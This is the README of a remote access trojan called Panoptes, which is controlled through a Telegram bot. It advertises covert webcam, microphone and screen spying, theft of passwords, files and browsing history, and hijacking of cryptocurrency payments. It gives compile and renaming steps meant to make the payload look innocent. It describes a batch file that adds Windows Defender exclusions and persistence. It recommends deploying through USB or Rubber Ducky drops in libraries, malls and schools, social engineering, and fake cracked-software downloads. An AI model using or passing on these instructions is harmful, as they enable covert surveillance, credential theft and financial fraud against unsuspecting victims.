# üïµÔ∏è‚Äç‚ôÇÔ∏è Panoptes - Remote Access Toolkit

A comprehensive remote access toolkit with Telegram-based C&C (Command and Control), designed for monitoring and data exfiltration.

## üîç Overview

Panoptes is a powerful spying tool that gives you full control over an infected computer. You can watch the user in real-time through their webcam and microphone, see their screen, and steal their passwords, files, and browsing history. It also lets you run commands on the system and can even hijack cryptocurrency payments. All control is managed through your own Telegram Bot.

The **Quick Deployment** method requires the computer to have **Administrator access**, as the toolkit itself has no built-in evasion techniques. It relies entirely on the `.bat` file being run with elevated privileges to automatically add persistence and add the main payload to the Windows Defender exclusion path. You can pull this off by either using **social engineering** to trick a user into running the `.bat` file with Admin rights, or by manually installing it via a normal **USB** or a **Rubber Ducky** in places with vulnerable computers, such as tech stores in malls or libraries and schools, where an admin rights user account is most of the time open.

The **Advanced Deployment** method is for those with their own AV evasion techniques. You compile a **custom executable** that bypasses antivirus software. This method can be used by making your software seem legitimate, making it much easier to trick a user into downloading and running it, or you can also manually install this on computers via **USB** or **Rubber Ducky** since it **doesn't require admin rights** to evade antivirus. However, since there is no ``.bat`` file, you need to add your own **persistence mechanism** into the **main Python file** before compiling the final payload.

## üöÄ Deployment Methods

### Method 1: Quick Deployment (Admin Required)
```
custom_name.tmp + deploy.bat
```
<br>

**Step 1: Install Required Dependencies**

Open command prompt as administrator and run:

```
pip install requests pycryptodome opencv-python pillow pyperclip pynput sounddevice psutil win32crypt nuitka
```

If any module is missing, install it individually:

```
pip install "module name"
pip install requests  
pip install pycryptodome
```

<br>

**Step 2: Compile with Nuitka**

Compile to create a standalone executable:

```
nuitka --onefile --follow-imports --windows-disable-console --include-package=requests --include-package=pycryptodome --include-package=cv2 --include-package=PIL --include-package=pyperclip --include-package=pynput --include-package=sounddevice --include-package=psutil --include-package=win32crypt main.pyw
```

This will create a `.exe` file without console window.

<br>

**Step 3: Rename File for Stealth**

Rename the compiled file (Command Prompt):

```
ren system.exe custom_name.tmp
```

*Renaming to `.tmp` makes it look less suspicious than a random `.exe` file*

<br>

**Step 4: Update Batch File**

Update `deploy.bat` on line 16 with your new file name:

```
set "SOURCE_FILE=%~dp0custom_name.tmp"
```

<br>

**Step 5: Deploy**

Add both files to the same folder and run `deploy.bat` as Administrator

- Batch file automatically adds your file to Windows Defender exclusions
- Creates persistence via scheduled tasks/registry  
- Executes your payload with full system privileges
  
**Perfect for:** USB drops on open vulnerable computers *(Ex: libraries, malls, schools)* or social engineering where you convince someone to run the `.bat` as admin.

<br>

### Method 2: Advanced Custom Deployment

```
custom_app.exe (Packed / Obfuscated)
```

**How it works:**
- Modify ```main.pyw``` to create a unique, undetectable executable
- Replace ```"TOKEN"``` & ```"ID``` with your actual Telegram Bot Token and ID
- Use packing, obfuscation, file pumping, code signing and other evasion techniques to bypass AV 
- Since your compiled executable bypasses antivirus, you can disguise it as any legitimate program
- Then deploy your payload through any method - it appears as a clean, trusted file

**Perfect for:** Fake software downloads *(Ex: YouTube "cracked software" tutorials)*, email attachments, or any scenario where you need a clean, undetectable file that appears legitimate to the end user.
